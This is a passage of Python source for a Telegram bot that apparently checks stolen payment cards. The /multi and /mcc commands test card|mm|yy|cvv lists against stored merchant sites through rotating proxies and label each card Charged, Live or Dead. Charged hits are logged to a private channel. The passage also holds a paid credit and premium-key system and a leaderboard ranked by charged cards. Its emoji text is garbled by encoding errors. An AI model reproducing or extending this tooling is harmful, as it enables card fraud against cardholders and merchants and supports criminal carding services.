        await event.reply(premium_emoji(f"馃摝 <b>Backup Created!</b>\n\nSending backup of {count} proxies before clearing..."), file=backup_filename, parse_mode='html')
        
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        return await event.reply(premium_emoji(f"鉂� Error creating backup: {e}"), parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    
    await event.reply(premium_emoji(f"鉁� <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy(@\w+)?(\s+.*)?$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("鉂� No proxies in <code>proxy.txt</code>"), parse_mode='html')
    
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>馃搵 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        
        await event.reply(premium_emoji(f"<b>馃搵 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        
        try:
            os.remove(filename)
        except:
            pass


# ========== /userlist - Admin: list all premium users ==========

@bot.on(events.NewMessage(pattern=r'^/userlist(@\w+)?(\s+.*)?$'))
async def userlist_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    premium_data = load_premium_users()
    if not premium_data:
        return await event.reply(premium_emoji("鉂� No premium users found."), parse_mode='html')

    lines = []
    now = datetime.now()
    for uid, info in premium_data.items():
        try:
            expiry_dt = datetime.fromisoformat(info['expiry'])
            days_left = (expiry_dt - now).days
            plan = info.get('plan_key', 'custom').upper()
            credits = get_user_credits(int(uid))
            status = "鉁�" if days_left > 0 else "鉂� EXPIRED"
            lines.append(f"馃懁 <code>{uid}</code> | {plan} | {days_left}d left | 馃挵{credits} | {status}")
        except:
            lines.append(f"馃懁 <code>{uid}</code> | 鈿狅笍 data error")

    total = len(lines)
    chunk_size = 30
    for i in range(0, total, chunk_size):
        chunk = lines[i:i+chunk_size]
        msg = f"<b>馃懃 Premium Users ({i+1}-{min(i+chunk_size, total)} of {total})</b>\n\n" + "\n".join(chunk)
        await event.reply(premium_emoji(msg), parse_mode='html')


# ========== /checkcredits - Admin: check any user's credits ==========

@bot.on(events.NewMessage(pattern=r'^/checkcredits(@\w+)?(\s+.*)?$'))
async def checkcredits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/checkcredits user_id</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id"), parse_mode='html')

    credits = get_user_credits(target_id)
    is_prem = is_premium(target_id)
    plan = get_user_plan_name(target_id)
    await event.reply(premium_emoji(
        f"<b>馃挵 User Credits Info</b>\n\n"
        f"馃懁 User: <code>{target_id}</code>\n"
        f"馃挸 Credits: <b>{credits}</b>\n"
        f"猸� Status: {'PREMIUM' if is_prem else 'FREE'}\n"
        f"馃搵 Plan: {plan}"
    ), parse_mode='html')


# ========== /setcredits - Admin: set exact credits ==========

@bot.on(events.NewMessage(pattern=r'^/setcredits(@\w+)?(\s+.*)?$'))
async def setcredits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("鉂� Usage: <code>/setcredits user_id amount</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
        if amount < 0:
            raise ValueError
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id or amount"), parse_mode='html')

    credits_data = load_credits()
    credits_data[str(target_id)] = amount
    save_credits(credits_data)

    await event.reply(premium_emoji(
        f"鉁� <b>Credits Set!</b>\n\n馃懁 User: <code>{target_id}</code>\n馃挵 New Credits: {amount}"
    ), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji(
            f"馃挵 <b>Your credits have been updated!</b>\n\nNew Balance: {amount} credits"
        ), parse_mode='html')
    except:
        pass


# ========== /transfercredits - User: transfer credits to another user ==========

@bot.on(events.NewMessage(pattern=r'^/transfercredits(@\w+)?(\s+.*)?$'))
async def transfercredits_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Premium Required!</b>\n\nOnly premium users can transfer credits."), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("鉂� Usage: <code>/transfercredits user_id amount</code>\n\nExample: /transfercredits 123456789 500"), parse_mode='html')

    try:
        target_id = int(args[1])
        amount = int(args[2])
        if amount <= 0:
            raise ValueError
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id or amount"), parse_mode='html')

    if target_id == user_id:
        return await event.reply(premium_emoji("鉂� You cannot transfer credits to yourself!"), parse_mode='html')

    current = get_user_credits(user_id)
    if current < amount:
        return await event.reply(premium_emoji(
            f"鉂� <b>Insufficient Credits!</b>\n\nYou have {current} credits.\nYou need {amount} credits to transfer."
        ), parse_mode='html')

    remove_credits(user_id, amount)
    add_credits(target_id, amount)

    new_sender = get_user_credits(user_id)
    new_receiver = get_user_credits(target_id)

    await event.reply(premium_emoji(
        f"鉁� <b>Transfer Successful!</b>\n\n"
        f"馃捀 Sent: {amount} credits 鈫� <code>{target_id}</code>\n"
        f"馃挵 Your remaining credits: {new_sender}"
    ), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji(
            f"馃挵 <b>You received {amount} credits!</b>\n\nFrom user: <code>{user_id}</code>\nYour new balance: {new_receiver} credits"
        ), parse_mode='html')
    except:
        pass


# ========== /myhistory - User: view own hit stats ==========

@bot.on(events.NewMessage(pattern=r'^/myhistory(@\w+)?(\s+.*)?$'))
async def myhistory_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')

    data = load_hit_stats()
    uid = str(user_id)
    stats = data.get(uid, {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0})

    charged = stats.get('charged', 0)
    approved = stats.get('approved', 0)
    dead = stats.get('dead', 0)
    total = stats.get('total', 0)
    hit_rate = f"{((charged + approved) / total * 100):.1f}%" if total > 0 else "0%"

    msg = f"""<b>馃搳 Your Hit History</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<blockquote>鉁� Charged: {charged}
馃枻 Live: {approved}
鉂� Dead: {dead}
馃挸 Total Checked: {total}
馃幆 Hit Rate: {hit_rate}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃 <b>Bot By: <a href="tg://user?id=7415233736">Mydev1</a></b>"""

    await event.reply(premium_emoji(msg), parse_mode='html')


# ========== /ping - Check bot response time ==========

@bot.on(events.NewMessage(pattern=r'^/ping(@\w+)?(\s+.*)?$'))
async def ping_command(event):
    import time as _time
    start = _time.time()
    msg = await event.reply(premium_emoji("馃彄 Pong!"), parse_mode='html')
    elapsed = (_time.time() - start) * 1000
    await msg.edit(premium_emoji(f"馃彄 <b>Pong!</b>\n\n鈿� Latency: <b>{elapsed:.0f}ms</b>"), parse_mode='html')


# ========== /allstats - Admin: full stats including hit history ==========

@bot.on(events.NewMessage(pattern=r'^/allstats(@\w+)?(\s+.*)?$'))
async def allstats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    credits_data = load_credits()
    hit_data = load_hit_stats()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()

    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)
    total_credits = sum(credits_data.values()) if credits_data else 0
    total_active = len(active_sessions)

    # Hit stats totals
    total_charged = sum(v.get('charged', 0) for v in hit_data.values())
    total_approved = sum(v.get('approved', 0) for v in hit_data.values())
    total_dead = sum(v.get('dead', 0) for v in hit_data.values())
    total_checked = sum(v.get('total', 0) for v in hit_data.values())

    # Expiring soon (within 2 days)
    now = datetime.now()
    expiring_soon = 0
    for info in premium_data.values():
        try:
            expiry_dt = datetime.fromisoformat(info['expiry'])
            if 0 < (expiry_dt - now).days <= 2:
                expiring_soon += 1
        except:
            pass

    msg = f"""<b>馃搳 Full Bot Statistics</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃懃 Users:</b>
鈥� Premium: {total_premium} | Banned: {total_banned}
鈥� Expiring in 2 days: {expiring_soon}

<b>馃挵 Credits:</b>
鈥� Total Active Credits: {total_credits}

<b>馃攽 Keys:</b>
鈥� Premium Keys: {total_keys} (Used: {used_premium_keys})
鈥� Credit Keys: {total_credit_keys} (Used: {used_credit_keys})

<b>馃寪 Data:</b>
鈥� Sites: {total_sites} | Proxies: {total_proxies}
鈥� Active Sessions: {total_active}

<b>馃幆 All-Time Hit Stats:</b>
鈥� 鉁� Charged: {total_charged}
鈥� 馃枻 Live: {total_approved}
鈥� 鉂� Dead: {total_dead}
鈥� 馃挸 Total Checked: {total_checked}

<b>馃幆 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}

馃 <b>Bot By: <a href="tg://user?id=7415233736">Mydev1</a></b>"""

    await event.reply(premium_emoji(msg), parse_mode='html')



# ========== /refer - Referral system ==========

@bot.on(events.NewMessage(pattern=r'^/refer(@\w+)?(\s+.*)?$'))
async def refer_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')

    args = event.message.text.split()

    # If user is using someone else's referral code
    if len(args) == 2:
        ref_code = args[1].strip().upper()
        success, referrer_id = process_referral(user_id, ref_code)
        if success:
            await event.reply(premium_emoji(
                f"鉁� <b>Referral Applied!</b>\n\n"
                f"馃巵 Your referrer received {REFERRAL_REWARD} credits!\n"
                f"馃挕 Use /refer to get your own referral code."
            ), parse_mode='html')
            try:
                await bot.send_message(referrer_id, premium_emoji(
                    f"馃帀 <b>Referral Bonus!</b>\n\n"
                    f"馃懁 User <code>{user_id}</code> used your referral code!\n"
                    f"馃挵 You earned {REFERRAL_REWARD} credits!\n"
                    f"馃挸 New balance: {get_user_credits(referrer_id)} credits"
                ), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji("鉂� Invalid or already used referral code."), parse_mode='html')
        return

    # Show user's own referral code
    code_val = get_referral_code(user_id)
    data = load_referrals()
    uid = str(user_id)
    info = data.get(uid, {})
    referred_count = len(info.get('referred', []))
    total_earned = info.get('total_earned', 0)

    msg = f"""<b>馃敆 Your Referral Info</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<blockquote>馃幆 Your Code: <code>{code_val}</code>
馃懃 People Referred: {referred_count}
馃挵 Total Earned: {total_earned} credits</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>How to use:</b>
Share your code with friends.
When they use <code>/refer {code_val}</code>, you get {REFERRAL_REWARD} credits!

馃 <b>Bot By: <a href="tg://user?id=7415233736">Mydev1</a></b>"""
    await event.reply(premium_emoji(msg), parse_mode='html')


# ========== /topusers - Top 10 hit users ==========

@bot.on(events.NewMessage(pattern=r'^/topusers(@\w+)?(\s+.*)?$'))
@bot.on(events.NewMessage(pattern=r'^/leaderboard(@\w+)?(\s+.*)?$'))
async def topusers_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')

    data = load_hit_stats()
    if not data:
        return await event.reply(premium_emoji("鉂� No hit data available yet."), parse_mode='html')

    # Sort by charged hits
    sorted_users = sorted(data.items(), key=lambda x: x[1].get('charged', 0), reverse=True)[:10]

    medals = ["馃", "馃", "馃", "4锔忊儯", "5锔忊儯", "6锔忊儯", "7锔忊儯", "8锔忊儯", "9锔忊儯", "馃敓"]
    lines = []
    for i, (uid, stats) in enumerate(sorted_users):
        charged = stats.get('charged', 0)
        approved = stats.get('approved', 0)
        total = stats.get('total', 0)
        lines.append(f"{medals[i]} <code>{uid}</code> | 鉁厈charged} 馃枻{approved} 馃挸{total}")

    msg = "<b>馃弳 Top 10 Users (by Charged Hits)</b>\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n" + "\n".join(lines)
    msg += "\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"
    await event.reply(premium_emoji(msg), parse_mode='html')


# ========== /exportstats - Admin export hit stats ==========

@bot.on(events.NewMessage(pattern=r'^/exportstats(@\w+)?(\s+.*)?$'))
async def exportstats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    data = load_hit_stats()
    if not data:
        return await event.reply(premium_emoji("鉂� No stats data available."), parse_mode='html')

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"hit_stats_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 60 + "\n")
        await f.write("HIT STATISTICS EXPORT\n")
        await f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        await f.write("=" * 60 + "\n\n")
        await f.write(f"{'UserID':<20} {'Charged':>8} {'Live':>8} {'Dead':>8} {'Total':>8}\n")
        await f.write("-" * 60 + "\n")

        sorted_users = sorted(data.items(), key=lambda x: x[1].get('charged', 0), reverse=True)
        for uid, stats in sorted_users:
            charged = stats.get('charged', 0)
            approved = stats.get('approved', 0)
            dead = stats.get('dead', 0)
            total = stats.get('total', 0)
            await f.write(f"{uid:<20} {charged:>8} {approved:>8} {dead:>8} {total:>8}\n")

    await event.reply(
        premium_emoji(f"馃搳 <b>Stats Export</b>\n\nTotal users tracked: {len(data)}"),
        file=filename,
        parse_mode='html'
    )
    try:
        os.remove(filename)
    except:
        pass


# ========== /activecheck - Admin: see who is checking now ==========

@bot.on(events.NewMessage(pattern=r'^/activecheck(@\w+)?(\s+.*)?$'))
async def activecheck_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')

    active_users = list(_user_active_sessions.keys())
    total_sessions = len(active_sessions)

    if not active_users:
        return await event.reply(premium_emoji("鉁� <b>No active checking sessions right now.</b>"), parse_mode='html')

    lines = [f"鈥� <code>{uid}</code>" for uid in active_users]
    msg = f"<b>鈿� Active Sessions: {total_sessions}</b>\n\n" + "\n".join(lines)
    await event.reply(premium_emoji(msg), parse_mode='html')


# ========== CALLBACKS ==========

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("鈴革笍 Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("鈻讹笍 Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("馃洃 Stopped"))
        await event.edit(premium_emoji("馃悋 **Checking stopped by user.**"))

# ========== RESOLVE CHAT IDs ON STARTUP ==========


# ========== MASS 10 CARDS CHECK COMMAND (/multi) ==========

@bot.on(events.NewMessage(pattern=r'^/multi(@\w+)?(\s+.*)?$'))
async def multi_cc_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    # Check if this is a group and if group checking is enabled
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    # Allow free checking in enabled groups, otherwise require premium
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    # File support for /multi
    cc_input = re.sub(r'^/multi(@\w+)?(\s+)?', '', event.message.text).strip()
    if not cc_input:
        if event.message.document:
            file_data = await event.message.download_media(file=bytes)
            cc_input = file_data.decode('utf-8', errors='ignore')
        elif event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.document:
                file_data = await reply_msg.download_media(file=bytes)
                cc_input = file_data.decode('utf-8', errors='ignore')
    
    if not cc_input:
        return await event.reply(premium_emoji("鉂� Usage: <code>/multi card1|mm|yy|cvv ...</code> or send a .txt file with /multi caption"), parse_mode='html')
    
    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply(premium_emoji("鉂� Invalid CC format. Use: <code>/multi card|mm|yy|cvv card|mm|yy|cvv ...</code>"), parse_mode='html')
    
    # Limit cards in groups to 500, otherwise 10
    max_cards = 500 if is_group_check else 10
    if len(cards) > max_cards:
        await event.reply(premium_emoji(f"鈿狅笍 You provided {len(cards)} cards. Limiting to first {max_cards} cards."), parse_mode='html')
        cards = cards[:max_cards]
    
    if not is_group_enabled_check:
        current_credits = get_user_credits(user_id)
        if current_credits < len(cards):
            return await event.reply(premium_emoji(f"鉂� <b>Insufficient Credits!</b>\n\nYou need {len(cards)} credits to check {len(cards)} cards.\nYour available credits: {current_credits}\n\nUse /redeemcredit CREDIT_KEY to add more credits."), parse_mode='html')
    else:
        current_credits = "Free"
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites:
        return await event.reply(premium_emoji("鉂� No sites available. Contact admin."), parse_mode='html')
    if not proxies:
        proxies = [None] # Use direct connection if no proxies available
    
    credit_display = f"{current_credits} (Will deduct {len(cards)})" if not is_group_enabled_check else "Free (Group Mode)"
    status_msg = await event.reply(premium_emoji(f"<b>馃挸 Multi Checker </b>\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n鈴� Starting check for {len(cards)} cards...\n<b>馃挵 Credits: {credit_display}</b>"), parse_mode='html')
    
    charged = []
    approved = []
    dead = []
    
    try:
        for i, card in enumerate(cards):
            try:
                result = await check_card_with_retry(card, sites, proxies, max_retries=2)
                if not is_group_enabled_check:
                    success, new_credits = deduct_credit(user_id)
                else:
                    success = True
                    new_credits = "Free"
                
                is_charged = result['status'] == 'Charged' or 'order completed' in result.get('message', '').lower() or '馃拵' in result.get('message', '') or 'order_placed' in result.get('message', '').lower() or 'ORDER_PLACED' in result.get('message', '')
                
                if is_charged:
                    charged.append({'card': card, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                    # Send to PVT channel (ONLY CHARGED)
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id)
                    except:
                        pass
                elif result['status'] == 'Approved':
                    approved.append({'card': card, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                else:
                    dead.append({'card': card, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                
                # Update progress every 2 cards
                if (i + 1) % 2 == 0 or (i + 1) == len(cards):
                    progress_text = f"""<b>馃挸 Multi Checker </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悘饾惈饾惃饾悹饾惈饾悶饾惉饾惉</b>
<blockquote>馃搳 Checked: {i+1}/{len(cards)}</blockquote>
<blockquote>鉁� Charged: {len(charged)} | 馃枻 Live: {len(approved)} | 鉂� Dead: {len(dead)}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""
                    try:
                        await status_msg.edit(premium_emoji(progress_text), parse_mode='html')
                    except:
                        pass
                
            except Exception as e:
                dead.append({'card': card, 'msg': str(e)[:100], 'gateway': 'Unknown', 'price': '-'})
        
        # Final results
        results_text = f"""<b>馃挸 Multi Check Results </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悞饾惍饾惁饾惁饾悮饾惈饾惒</b>
<blockquote>馃挸 Total: {len(cards)} | 鉁� Charged: {len(charged)} | 馃枻 Live: {len(approved)} | 鉂� Dead: {len(dead)}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""
        
        if charged:
            results_text += "\n<b>鉁� CHARGED:</b>\n"
            for r in charged[:5]:
                results_text += f"<code>{r['card']}</code> | {r['gateway']} | {r['price']}\n"
            if len(charged) > 5:
                results_text += f"... and {len(charged) - 5} more\n"
        
        if approved:
            results_text += "\n<b>馃枻 LIVE:</b>\n"
            for r in approved[:5]:
                results_text += f"<code>{r['card']}</code> | {r['gateway']} | {r['price']}\n"
            if len(approved) > 5:
                results_text += f"... and {len(approved) - 5} more\n"
        
        remaining_credits = get_user_credits(user_id) if not is_group_enabled_check else "Free"
        results_text += f"\n<b>馃挵 Credits Left: {remaining_credits}</b>\n\n馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"""
        
        await status_msg.edit(premium_emoji(results_text), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� Error during multi-check: {e}"), parse_mode='html')

# ========== MASS SITE CHECK COMMAND (/mcc) ==========

@bot.on(events.NewMessage(pattern=r'^/mcc(@\w+)?(\s+.*)?$'))
async def mass_site_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    # Check if this is a group and if group checking is enabled
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    # Allow free checking in enabled groups, otherwise require premium
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    # For mass checking, user must have set their own proxy unless in an enabled group
    user_proxies = get_user_specific_proxies(user_id)
    if not user_proxies and not is_admin(user_id) and not is_group_enabled_check:
        return await event.reply(premium_emoji("鉂� <b>You must set your personal proxy first!</b>\n\nUse /setproxy <proxy> to set your proxy.\n\nExample: /setproxy 1.2.3.4:8080"), parse_mode='html')
    
    try:
        cc_input = re.sub(r'^/mcc(@\w+)?(\s+)?', '', event.message.text).strip()
    except IndexError:
        return await event.reply(premium_emoji("鉂� Usage: <code>/mcc card|mm|yy|cvv</code>\n\nChecks one card against ALL available sites!"), parse_mode='html')
    
    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply(premium_emoji("鉂� Invalid CC format. Use: <code>/mcc card|mm|yy|cvv</code>"), parse_mode='html')
    
    card = cards[0]
    
    sites = load_sites()
    proxies = user_proxies if user_proxies else load_proxies()
    
    if not sites:
        return await event.reply(premium_emoji("鉂� No sites available. Contact admin."), parse_mode='html')
    if not proxies:
        proxies = [None] # Use direct connection if no proxies available
    
    if not is_group_enabled_check:
        current_credits = get_user_credits(user_id)
        if current_credits < 1:
            return await event.reply(premium_emoji(f"鉂� <b>Insufficient Credits!</b>\n\nYou need at least 1 credit to check a card.\nYour Credits: {current_credits}\n\nUse /redeemcredit CREDIT_KEY to add credits."), parse_mode='html')
    else:
        current_credits = "Free"
    
    credit_display = f"{current_credits} (1 credit will be deducted)" if not is_group_enabled_check else "Free (Group Mode)"
    status_msg = await event.reply(premium_emoji(f"<b>馃挸 Mass Site Check </b>\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n鈴� Checking 1 card against {len(sites)} sites...\n<code>{card}</code>\n<b>馃挵 Credits: {credit_display}</b>"), parse_mode='html')
    
    charged = []
    approved = []
    dead = []
    
    try:
        for i, site in enumerate(sites):
            try:
                proxy = random.choice(proxies)
                result = await check_card(card, site, proxy)
                
                is_charged = result['status'] == 'Charged' or 'order completed' in result.get('message', '').lower() or '馃拵' in result.get('message', '') or 'order_placed' in result.get('message', '').lower() or 'ORDER_PLACED' in result.get('message', '')
                
                if is_charged:
                    charged.append({'site': site, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                    # Send to PVT channel (ONLY CHARGED)
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id)
                    except:
                        pass
                elif result['status'] == 'Approved':
                    approved.append({'site': site, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                else:
                    dead.append({'site': site, 'msg': result.get('message', '')[:100], 'gateway': result.get('gateway', 'Unknown'), 'price': result.get('price', '-')})
                
                # Update progress every 5 sites
                if (i + 1) % 5 == 0 or (i + 1) == len(sites):
                    progress_text = f"""<b>馃挸 Mass Site Check </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悘饾惈饾惃饾悹饾惈饾悶饾惉饾惉</b>
<blockquote>馃搳 Checked: {i+1}/{len(sites)} sites</blockquote>
<blockquote>鉁� Charged: {len(charged)} | 馃枻 Live: {len(approved)} | 鉂� Dead: {len(dead)}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""
                    try:
                        await status_msg.edit(premium_emoji(progress_text), parse_mode='html')
                    except:
                        pass
                
            except Exception as e:
                dead.append({'site': site, 'msg': str(e)[:100], 'gateway': 'Unknown', 'price': '-'})
        
        # Deduct 1 credit for the check
        if not is_group_enabled_check:
            success, new_credits = deduct_credit(user_id)
        else:
            success = True
            new_credits = "Free"
        
        # Final results
        results_text = f"""<b>馃挸 Mass Site Check Results </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悞饾惍饾惁饾惁饾悮饾惈饾惒</b>
<blockquote>馃挸 Card: <code>{card}</code></blockquote>
<blockquote>馃寪 Total Sites: {len(sites)} | 鉁� Charged: {len(charged)} | 馃枻 Live: {len(approved)} | 鉂� Dead: {len(dead)}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""
        
        if charged:
            results_text += "\n<b>鉁� CHARGED SITES:</b>\n"
            for r in charged[:5]:
                results_text += f"<code>{r['site']}</code> | {r['gateway']} | {r['price']}\n"
            if len(charged) > 5:
                results_text += f"... and {len(charged) - 5} more\n"
        
        if approved:
            results_text += "\n<b>馃枻 LIVE SITES:</b>\n"
            for r in approved[:5]:
                results_text += f"<code>{r['site']}</code> | {r['gateway']} | {r['price']}\n"
            if len(approved) > 5:
                results_text += f"... and {len(approved) - 5} more\n"
        
        remaining_credits = get_user_credits(user_id) if not is_group_enabled_check else "Free"
        results_text += f"\n<b>馃挵 Credits Left: {remaining_credits}</b>\n\n馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"""
        
        await status_msg.edit(premium_emoji(results_text), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� Error during mass site check: {e}"), parse_mode='html')



# ========== BACKGROUND: AUTO EXPIRY WARNING ==========

async def expiry_warning_loop():
